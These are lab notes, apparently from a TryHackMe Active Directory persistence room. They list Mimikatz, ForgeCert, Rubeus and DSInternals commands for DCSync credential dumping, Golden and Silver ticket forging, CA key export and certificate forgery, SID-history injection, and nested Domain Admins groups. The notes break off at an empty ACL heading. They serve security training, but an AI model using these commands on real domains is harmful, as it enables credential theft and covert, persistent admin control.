# Persisting Active Directory

### Persistence through Credentials

```batch
lsadump::dcsync /domain:za.tryhackme.loc /user:<Your low-privilege AD Username>
```

DC sync every single account. To do this, we will have to enable logging on Mimikatz:

```batch
log <username>_dcdump.txt 
```

DC Sync all accounts

```batch
mimikatz # lsadump::dcsync /domain:za.tryhackme.loc /all
```

### Persistence through Tickets

Command to generate Golden Ticket

```batch
mimikatz # kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /krbtgt:<NTLM hash of KRBTGT account> /endin:600 /renewmax:10080 /ptt
```

Command to generate SiIver Ticket

```batch
mimikatz # kerberos::golden /admin:StillNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /target:<Hostname of server being targeted> /rc4:<NTLM Hash of machine account of target> /service:cifs /ptt
```

### Persistence through Certificate

Command to view certificates stored on the DC

```batch
crypto::certificates /systemstore:local_machine
```

some of these certificates were set not to allow us to export the key. Without this private key, we would not be able to generate new certificates. Luckily, Mimikatz allows us to patch memory to make these keys exportable

```batch
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # crypto::capi
Local CryptoAPI RSA CSP patched
Local CryptoAPI DSS CSP patched

mimikatz # crypto::cng
"KeyIso" service patched
```

With these services patched, we can use Mimikatz to export the certificates

```batch
crypto::certificates /systemstore:local_machine /export
```

we have the private key and root CA certificate, we can use the SpectorOps [ForgeCert](https://github.com/GhostPack/ForgeCert) tool to forge a Client Authenticate certificate for any user we want

```batch
za\aaron.jones@THMWRK1 C:\Users\aaron.jones>C:\Tools\ForgeCert\ForgeCert.exe --CaCertPath za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123 
```

We can use Rubeus to request a TGT using the certificate to verify that the certificate is trusted

<pre class="language-batch"><code class="lang-batch"><strong>Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:vulncert.pfx /password:tryhackme /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:10.200.x.101
</strong></code></pre>

Now we can use Mimikatz to load the TGT and authenticate

```batch
mimikatz # kerberos::ptt administrator.kirbi
```

### Persistence through SID History

To get sid of  Domain Admin group

```markup
PS C:\Users\Administrator.ZA> Get-ADGroup "Domain Admins"
```

To set SID to low Privelaged Account

We could use something like Mimikatz to add SID history. However, the latest version of Mimikatz has a flaw that does not allow it to patch LSASS to update SID history. Hence we need to use something else. In this case, we will use the [DSInternals](https://github.com/MichaelGrafnetter/DSInternals) tools to directly patch the ntds.dit file, the AD database where all information is stored

```markup
PS C:\Users\Administrator.ZA>Stop-Service -Name ntds -force 
PS C:\Users\Administrator.ZA> Add-ADDBSidHistory -SamAccountName 'username of our low-priveleged AD account' -SidHistory 'SID to add to SID History' -DatabasePath C:\Windows\NTDS\ntds.dit 
PS C:\Users\Administrator.ZA>Start-Service -Name ntds 
```

### Persistence through Group Membership

Nesting Our Persistence

Command To Create nested group

```batch
PS C:\Users\Administrator.ZA>New-ADGroup -Path "OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 1" -SamAccountName "<username>_nestgroup1" -DisplayName "<username> Nest Group 1" -GroupScope Global -GroupCategory Security
```

&#x20;Command to add group to the Domain Admins group

```batch
PS C:\Users\Administrator.ZA>Add-ADGroupMember -Identity "Domain Admins" -Members "<username>_nestgroup5"
```

Command to add low-privileged AD user to the first group we created

```batch
PS C:\Users\Administrator.ZA>Add-ADGroupMember -Identity "<username>_nestgroup1" -Members "<low privileged username>"
```

### Persistence through ACL

